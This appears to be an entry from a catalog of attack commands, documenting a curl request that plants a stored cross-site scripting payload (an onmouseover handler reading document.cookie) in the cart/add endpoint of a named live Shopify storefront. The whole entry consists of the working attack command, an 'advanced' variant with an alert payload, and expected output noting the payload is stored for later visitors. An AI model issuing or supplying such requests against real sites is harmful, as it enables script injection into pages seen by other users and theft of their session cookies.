---
id: cmd-uuid-1
data: >-
  curl -X GET
  "http://hardware.shopify.com/cart/add?id=1106494145&properties[builder_id][%20onmouseover%3dalert(document.cookie)%20\"]=shapp_options_421549285_1455208671885"
tags:
  - web
  - xss
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:16:07.943Z'
verified: false
validated: true
submitted: true
---
# curl-shopify-cart-add

## Command

```bash
curl -X GET "http://hardware.shopify.com/cart/add?id=1106494145&properties[builder_id][%20onmouseover%3dalert(document.cookie)%20\"]=shapp_options_421549285_1455208671885"
```

## Description

This command uses curl to send a GET request to Shopify's cart/add endpoint, adding a product with a malicious XSS payload in the properties[builder_id] parameter to store the injection.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X GET` | Specifies HTTP method | Yes |
| URL | Full endpoint with id and properties params | Yes |

## Examples

### Basic Usage

```bash
curl -X GET "http://example.shopify.com/cart/add?id=123&properties[builder_id][]=test"
```

### Advanced Usage

```bash
curl -X GET "http://hardware.shopify.com/cart/add?id=1106494145&properties[builder_id][%20onmouseover%3dalert(1)%20\"]=value" -v
```

## Expected Output

HTTP 302 redirect to cart or 200 OK with success message; payload stored for subsequent views.

## Related

- [[Related Procedure]]
